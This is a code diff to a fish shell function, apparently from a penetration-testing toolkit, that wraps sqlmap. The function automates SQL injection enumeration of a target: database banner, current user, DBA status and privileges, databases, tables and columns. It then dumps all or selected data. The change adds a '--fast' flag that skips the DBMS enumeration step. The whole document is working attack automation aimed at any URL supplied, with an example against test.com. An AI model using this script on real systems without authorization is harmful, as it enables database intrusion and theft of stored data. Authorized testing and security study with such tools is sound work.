@@ -8,14 +8,29 @@ function _ezpz_enumsqli
     echo ' \___| _| _| \_,_| _|_|_|'(set_color magenta --bold)'  ____/ \__\_\ ____| '(set_color normal)
     echo ''
 
+    # Parse arguments for our flags
+    set -l parsed_args (argparse --ignore-unknown 'h/help' 'F/fast' -- $argv 2>/dev/null)
+    or set parsed_args
+    
     # Usage message
     set usage "
-Usage: ezpz enumsqli [sqlmap_options]
+Usage: ezpz enumsqli [options] [sqlmap_options]
   A wrapper for sqlmap to automate enumeration and dumping.
   Pass any valid sqlmap options for targeting (e.g., -u 'http://...').
 
+Options:
+  -F, --fast    Skip DBMS enumeration and go directly to data enumeration
+  -h, --help    Show this help message
+
 Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
+Example: ezpz enumsqli -F -u 'http://test.com/vuln.php?id=1' --cookie='...'
 "
+
+    # Show help if requested
+    if set -q _flag_help
+        echo $usage
+        return 0
+    end
 
     # Check if sqlmap is installed
     if not command -v sqlmap >/dev/null
@@ -23,42 +38,61 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
         return 1
     end
 
-    # If no arguments provided, show usage
-    if test (count $argv) -eq 0
+    # Remove our flags from argv for sqlmap
+    set sqlmap_args
+    set skip_next false
+    for arg in $argv
+        if test "$skip_next" = true
+            set skip_next false
+            continue
+        end
+        switch $arg
+            case '-F' '--fast' '-h' '--help'
+                # Skip our flags
+            case '*'
+                set sqlmap_args $sqlmap_args $arg
+        end
+    end
+
+    # If no sqlmap arguments provided, show usage
+    if test (count $sqlmap_args) -eq 0
         ezpz_error "Missing sqlmap parameters."
         echo $usage
         return 1
     end
 
-    # Start DBMS enumeration
-    ezpz_title "Starting DBMS enumeration..."
+    # Skip DBMS enumeration if -F flag is used
+    if not set -q _flag_fast
+        # Start DBMS enumeration
+        ezpz_title "Starting DBMS enumeration..."
 
-    # Banner
-    ezpz_header "Fetching database banner"
-    ezpz_cmd "sqlmap $argv --banner --batch"
-    sqlmap $argv --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:" | grep -v '^$'
+        # Banner
+        ezpz_header "Fetching database banner"
+        ezpz_cmd "sqlmap $sqlmap_args --banner --batch"
+        sqlmap $sqlmap_args --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:" | grep -v '^$'
 
-    # Current user and DBA status
-    ezpz_header "Fetching current user and DBA status"
-    ezpz_cmd "sqlmap $argv --current-user --is-dba --batch"
-    sqlmap $argv --current-user --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')|(?<=DBA: ).*" | grep -v '^$'
+        # Current user and DBA status
+        ezpz_header "Fetching current user and DBA status"
+        ezpz_cmd "sqlmap $sqlmap_args --current-user --is-dba --batch"
+        sqlmap $sqlmap_args --current-user --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')|(?<=DBA: ).*" | grep -v '^$'
 
-    # User privileges
-    ezpz_header "Fetching user privileges"
-    ezpz_cmd "sqlmap $argv --privileges --batch"
-    sqlmap $argv --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'
+        # User privileges
+        ezpz_header "Fetching user privileges"
+        ezpz_cmd "sqlmap $sqlmap_args --privileges --batch"
+        sqlmap $sqlmap_args --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'
+    end
 
     # Start data enumeration
     ezpz_title "Starting data enumeration..."
     ezpz_header "Fetching all databases"
-    ezpz_cmd "sqlmap $argv --dbs --batch"
-    sqlmap $argv --dbs --batch 2>/dev/null | \
+    ezpz_cmd "sqlmap $sqlmap_args --dbs --batch"
+    sqlmap $sqlmap_args --dbs --batch 2>/dev/null | \
         tail -n +10 | \
         grep -vE '^[[:space:]]*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]' | \
         sed 's/^\[\*\] //' | grep --color=never -E '^[a-zA-Z0-9_]+$'
 
     # Get current database
-    set current_db (sqlmap $argv --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')")
+    set current_db (sqlmap $sqlmap_args --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')")
     
     # Ask user which database to enumerate
     ezpz_question "Select database (all/current/name) [current]: "
@@ -75,8 +109,8 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
             set db $current_db
         case "all"
             ezpz_header "Dumping all databases"
-            ezpz_cmd "sqlmap $argv --dump-all --batch"
-            sqlmap $argv --dump-all --batch
+            ezpz_cmd "sqlmap $sqlmap_args --dump-all --batch"
+            sqlmap $sqlmap_args --dump-all --batch
             return 0
         case '*'
             set db $db_choice
@@ -84,8 +118,8 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
 
     # Fetch tables for selected database
     ezpz_header "Fetching tables for database '$db'"
-    ezpz_cmd "sqlmap $argv -D \"$db\" --tables --batch"
-    sqlmap $argv -D "$db" --tables --batch 2>/dev/null | \
+    ezpz_cmd "sqlmap $sqlmap_args -D \"$db\" --tables --batch"
+    sqlmap $sqlmap_args -D "$db" --tables --batch 2>/dev/null | \
         #tail -n +10 | \
         grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | \
         sed 's/[[:space:]]*$//'
@@ -104,8 +138,8 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
     switch $table_choice
         case "" "all"
             ezpz_header "Dumping all tables"
-            ezpz_cmd "sqlmap $argv -D \"$db\" --dump --batch"
-            sqlmap $argv -D "$db" --dump --batch | \
+            ezpz_cmd "sqlmap $sqlmap_args -D \"$db\" --dump --batch"
+            sqlmap $sqlmap_args -D "$db" --dump --batch | \
                 tail -n +10 | \
                 grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
             return 0
@@ -114,8 +148,8 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
                 set table (string trim $table)
                 ezpz_title "Accessing table \"$table\"..."
                 ezpz_header "Retrieving columns for table '$table'"
-                ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --columns --batch"
-                sqlmap $argv -D "$db" -T "$table" --columns --batch 2>/dev/null | \
+                ezpz_cmd "sqlmap $sqlmap_args -D \"$db\" -T \"$table\" --columns --batch"
+                sqlmap $sqlmap_args -D "$db" -T "$table" --columns --batch 2>/dev/null | \
                     tail -n +10 | \
                     grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
 
@@ -127,14 +161,14 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
                 switch $column_choice
                     case "" "all"
                         ezpz_header "Dumping all columns from table '$table'"
-                        ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --dump --batch"
-                        sqlmap $argv -D "$db" -T "$table" --dump --batch | \
+                        ezpz_cmd "sqlmap $sqlmap_args -D \"$db\" -T \"$table\" --dump --batch"
+                        sqlmap $sqlmap_args -D "$db" -T "$table" --dump --batch | \
                             tail -n +10 | \
                             grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                     case '*'
                         ezpz_header "Dumping selected columns from table '$table'"
-                        ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" -C \"$column_choice\" --dump --batch"
-                        sqlmap $argv -D "$db" -T "$table" -C "$column_choice" --dump --batch | \
+                        ezpz_cmd "sqlmap $sqlmap_args -D \"$db\" -T \"$table\" -C \"$column_choice\" --dump --batch"
+                        sqlmap $sqlmap_args -D "$db" -T "$table" -C "$column_choice" --dump --batch | \
                             tail -n +10 | \
                             grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                 end
